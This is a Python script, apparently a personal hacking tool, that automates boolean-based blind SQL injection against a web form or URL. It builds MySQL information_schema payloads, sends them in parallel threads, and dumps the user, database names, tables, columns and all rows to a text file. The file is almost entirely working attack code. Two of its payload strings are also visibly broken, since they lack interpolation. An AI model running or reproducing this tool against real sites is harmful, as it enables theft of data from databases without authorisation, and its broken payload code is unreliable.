#!/usr/bin/python3

from dataclasses import dataclass
import requests
import signal
import sys
import time
import os
import re
import math
import concurrent.futures
import copy
from pwn import *


# Ctrl + c
def ctrlC(sig, frame):
    print(f"\n\n[{Color.RED}x{Color.END}] {Color.RED}Saliendo...{Color.END}\n")
    sys.exit(1)


signal.signal(signal.SIGINT, ctrlC)


# Classes
class Color:
    PURPLE = "\033[1;35;48m"
    CYAN = "\033[1;36;48m"
    BOLD = "\033[1;37;48m"
    BLUE = "\033[1;34;48m"
    GREEN = "\033[1;32;48m"
    YELLOW = "\033[1;33;48m"
    RED = "\033[1;31;48m"
    BLACK = "\033[1;30;48m"
    UNDERLINE = "\033[4;37;48m"
    END = "\033[1;37;0m"


@dataclass
class WrapperRequest:
    data: str | dict
    character: int


@dataclass
class DB:
    name: str
    tables: list


@dataclass
class Table:
    name: str
    columns: list
    rows: list

    def concat_columns(self) -> str:
        """Concatenates the columns to display them"""

        return ",'|',".join(self.columns)


class Extractor:

    def __init__(
        self,
        main_url,
        method,
        headers,
        condition,
        data,
        atribute_to_exploit=None,
        num_threads=1,
    ):
        self.main_url = main_url
        self.method = method
        self.headers = headers
        self.condition = condition
        self.num_threads = num_threads
        self.data = data
        self.atribute_to_exploit = atribute_to_exploit
        self._stop_threads = True
        self._character_finded = 0
        self._dbs = []

    @staticmethod
    def init_with_interface():
        """Alternative constructor, initializes the attributes with an interactive interface"""

        main_url = ""
        method = ""
        headers = {}
        data: str | dict = {}
        atribute_to_exploit = ""
        condition = ""
        num_threads = 1

        def get_input_rows(answer_size: int, text: str) -> int:
            """Determ the amount of lines of the user input"""

            size = os.get_terminal_size()
            match = re.search(r"columns=(\d+)", str(size))
            columns = int(match.group(1))

            return math.ceil((answer_size + len(text)) / columns)

        print(
            f"""
    {Color.BOLD}#####################################################################################################################################{Color.END}
    {Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {Color.END}     {Color.RED} SSS     QQQ    L      IIIII{Color.END}      {Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{Color.END}
    {Color.BLUE}B   B   L        I    NN  N  D   D{Color.END}     {Color.RED}S       Q   Q   L        I  {Color.END}      {Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{Color.END}
    {Color.BLUE}BBBBB   L        I    N N N  D   D{Color.END}     {Color.RED} SSS    Q   Q   L        I  {Color.END}      {Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{Color.END}
    {Color.BLUE}B   B   L        I    N  NN  D   D{Color.END}         {Color.RED}S   Q  QQ   L        I  {Color.END}      {Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{Color.END}
    {Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {Color.END}     {Color.RED}SSSS     QQ  Q  LLLLL  IIIII{Color.END}      {Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{Color.END}
    {Color.BOLD}#####################################################################################################################################{Color.END}\n
    """
        )

        label_url = log.progress(f"{Color.BOLD}Url{Color.END}")
        label_method = log.progress(f"{Color.BOLD}Method{Color.END}")
        label_headers = log.progress(f"{Color.BOLD}Headers{Color.END}")
        label_data = log.progress(f"{Color.BOLD}Data{Color.END}")
        label_exploit = log.progress(f"{Color.BOLD}Field to exploit{Color.END}")
        label_condition = log.progress(f"{Color.BOLD}Condition{Color.END}")
        label_threads = log.progress(f"{Color.BOLD}Threads{Color.END}")

        print("\n\n")

        while True:
            input_url = input(
                f"[{Color.BLUE}?{Color.END}] Request URL with https/http: "
            )

            if input_url and ("http://" in input_url or "https://" in input_url):
                main_url = input_url
                label_url.status(input_url)
                print("\033[A\033[J" * get_input_rows(33, input_url), end="")
                break
            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        while True:
            input_method = input(
                f"[{Color.BLUE}?{Color.END}] Request Method, GET/POST: "
            )

            if input_method and (input_method == "POST" or input_method == "GET"):
                method = input_method
                label_method.status(input_method)
                print("\033[A\033[J", end="")
                break
            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        follow_condition = input(
            f"[{Color.BLUE}?{Color.END}] Would you like to add headers to the request? y/n: "
        )
        print("\033[A\033[J", end="")

        if follow_condition == "y":
            while True:
                input_header = input(
                    f"[{Color.BLUE}?{Color.END}] Request Headers, use the following format <name>:<value> "
                )

                if input_header:
                    name, value = input_header.split(":")
                    headers[name] = value
                    label_headers.status(headers)
                    print("\033[A\033[J" * get_input_rows(61, input_header), end="")

                    follow_condition = input(
                        f"[{Color.BLUE}?{Color.END}] Would you like to add another header? y/n: "
                    )
                    print("\033[A\033[J", end="")

                    if follow_condition == "n":
                        break
                else:
                    print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                    print("\033[A\033[J" * 2, end="")
                    time.sleep(1)

        while True:
            input_data = input(
                f"[{Color.BLUE}?{Color.END}] Values with which the request is correct, in Post Request use the following format <name>:<value> "
            )

            if input_data:
                if method == "POST":
                    name, value = input_data.split(":")
                    data[name] = value
                    label_data.status(data)
                    print("\033[A\033[J" * get_input_rows(112, input_data), end="")

                    follow_condition = input(
                        f"[{Color.BLUE}?{Color.END}] Would you like to add another value? y/n: "
                    )
                    print("\033[A\033[J", end="")

                    if follow_condition == "n":
                        break

                else:
                    data = input_data
                    label_data.status(data)
                    print("\033[A\033[J", end="")
                    break

            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                print("\033[A\033[J" * 2, end="")
                time.sleep(1)

        if method == "POST":
            while True:
                input_exploit = input(
                    f"[{Color.BLUE}?{Color.END}] Name of the value that we want to exploit: "
                )

                if input_exploit:
                    atribute_to_exploit = input_exploit
                    label_exploit.status(input_exploit)
                    print("\033[A\033[J" * get_input_rows(47, input_data), end="")
                    break
                else:
                    print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                    time.sleep(1)
                    print("\033[A\033[J" * 2, end="")

        while True:
            input_condition = input(
                f"[{Color.BLUE}?{Color.END}] Text in the response by which we can detect that the result was correct: "
            )

            if input_condition:
                condition = input_condition
                label_condition.status(input_condition)
                print("\033[A\033[J" * get_input_rows(77, input_data), end="")
                break
            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        pc_threads = os.cpu_count() or 1
        if pc_threads != 1:
            try:
                input_threads = input(
                    f"[{Color.BLUE}?{Color.END}] Number of threads 1-{pc_threads}: "
                )
                print("\033[A\033[J", end="")
                if (
                    int(input_threads) in range(pc_threads + 1)
                    and int(input_threads) != 0
                ):
                    num_threads = int(input_threads)
            except ValueError:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")
        label_threads.status(num_threads)

        return Extractor(
            main_url, method, headers, condition, data, atribute_to_exploit, num_threads
        )

    def _select_color(self, info_name: str) -> str:
        """Determines the color that is used to display different values of the DB"""

        switcher = {
            "User": Color.UNDERLINE,
            "DBs": Color.PURPLE,
            "Tables": Color.CYAN,
            "Columns": Color.BLUE,
            "Rows": Color.BLUE,
        }

        return switcher.get(info_name, Color.BLUE)

    def _build_payload(
        self,
        exploit: str,
        position: int,
        character: int,
        db: DB | None,
        table: Table | None,
    ) -> str:
        """Build the payload to be used in dependency on what you want to extract from the database"""

        result = ""

        if exploit == "User":
            result = (
                f"' and (select ascii(substring(user(),{position},1)))='{character}"
            )
        elif exploit == "DBs":
            result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
        elif exploit == "Tables" and db is not None:
            result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
        elif exploit == "Columns" and db is not None and table is not None:
            result = "' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
        elif exploit == "Rows" and db is not None and table is not None:
            columns = table.concat_columns()
            result = "' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"

        return result

    def _build_data(
        self, info_name: str, position: int, db: DB | None, table: Table | None
    ) -> list:
        """Build the data for the request in dependency of the request method"""

        result = []
        characters = list(range(33, 127))

        for character in characters:
            if self.method == "POST":
                payload = f"{self.data[self.atribute_to_exploit]}{self._build_payload(info_name,position,character, db, table)}"
                data = copy.copy(self.data)
                data[self.atribute_to_exploit] = payload
                result.append(WrapperRequest(data, character))
            else:
                result.append(
                    WrapperRequest(
                        f"{self.main_url}{self.data}{self._build_payload(info_name,position,character, db, table)}",
                        character,
                    )
                )

        return result

    def _send_request(self, requests_data: WrapperRequest) -> str | None:
        """Send the request that contain the payload, is the function that is used in threading"""

        if self._stop_threads:
            return None

        if self.method == "POST":
            response = requests.post(
                self.main_url, headers=self.headers, data=requests_data.data
            )
        else:
            response = requests.get(str(requests_data.data), headers=self.headers)

        if self.condition in response.text:
            self._character_finded = requests_data.character
            self._stop_threads = True

        return chr(requests_data.character)

    def _get_info(
        self,
        label_info,
        label_menu,
        info_name: str,
        db: DB | None = None,
        table: Table | None = None,
    ) -> str:
        """Use Multithreads, build the payload and data to send the request"""

        self._stop_threads = True
        info = ""
        position = 1

        while self._stop_threads:
            self._stop_threads = False

            requests_data = self._build_data(info_name, position, db, table)

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.num_threads
            ) as executor:
                futures = {
                    executor.submit(self._send_request, data) for data in requests_data
                }
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    label_menu.status(result)
                    if self._stop_threads:
                        executor.shutdown(wait=False)
                        break

            if self._stop_threads:
                info += chr(self._character_finded)
                label_info.status(f"{self._select_color(info_name)}{info}{Color.END}")

            position += 1

        return info

    def get_user(self, label_menu) -> None:
        """Get the username that is running the DB process"""

        label_info = log.progress(Color.YELLOW + "User" + Color.END)
        self._get_info(label_info, label_menu, "User")
        print("\n")

    def get_dbs(self, label_menu) -> None:
        """Get the names of the data bases"""

        label_info = log.progress(Color.YELLOW + "DBs" + Color.END)
        info = self._get_info(label_info, label_menu, "DBs")

        new_dbs = info.split(",")
        for db_name in new_dbs:
            db = DB(db_name, [])
            self._dbs.append(db)

        print("\n")

    def get_tables(self, label_menu) -> None:
        """Get the name of the tables of each db"""

        for db in self._dbs:

            label_info = log.progress(
                f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
            )
            info = self._get_info(label_info, label_menu, "Tables", db)

            new_tables = info.split(",")
            for table_name in new_tables:
                table = Table(table_name, [], [])
                db.tables.append(table)

        print("\n")

    def get_columns(self, label_menu) -> None:
        """Get the name of the columns of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
                )
                info = self._get_info(label_info, label_menu, "Columns", db, table)

                new_columns = info.split(",")
                for column_name in new_columns:
                    table.columns.append(column_name)

        print("\n")

    def get_rows(self, label_menu) -> None:
        """Get the content of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
                )

                info = self._get_info(label_info, label_menu, "Rows", db, table)

                new_rows = info.split(",")
                for row in new_rows:
                    table.rows.append(row)

        print("\n")

    def build_file(self) -> None:
        """Save all the data in a txt file"""

        with open("db.txt", "w") as f:
            for db in self._dbs:
                f.write("DB: " + db.name + "\n")
                for table in db.tables:
                    f.write("Table: " + table.name + "\n")
                    f.write("Colums: " + table.concat_columns() + "\n")
                    f.write("Rows: " + "\n")
                    for row in table.rows:
                        f.write(row + "\n")

                    f.write("\n\n")
                f.write("\n\n\n")

        print(
            f"\n\n[{Color.YELLOW}!{Color.END}] {Color.BOLD}More details in db.txt{Color.END}\n"
        )


def main():
    """
    # Initiate parameters specifying them
    main_url = "http://"
    method = "GET"
    headers = {}
    condition = ""
    num_threads = 1
    data = ""
    atribute_to_exploit = ""

    instance = Extractor(main_url,method,headers,condition,data,atribute_to_exploit,num_threads)
    """

    # Initiate parameters with interface
    instance = Extractor.init_with_interface()

    label_menu = log.progress(Color.RED + "Brute Force" + Color.END)
    label_menu.status(" Starting ...")
    print("\n")
    time.sleep(1)

    instance.get_user(label_menu)
    instance.get_dbs(label_menu)
    instance.get_tables(label_menu)
    instance.get_columns(label_menu)
    instance.get_rows(label_menu)
    instance.build_file()


# Main
if __name__ == "__main__":
    main()
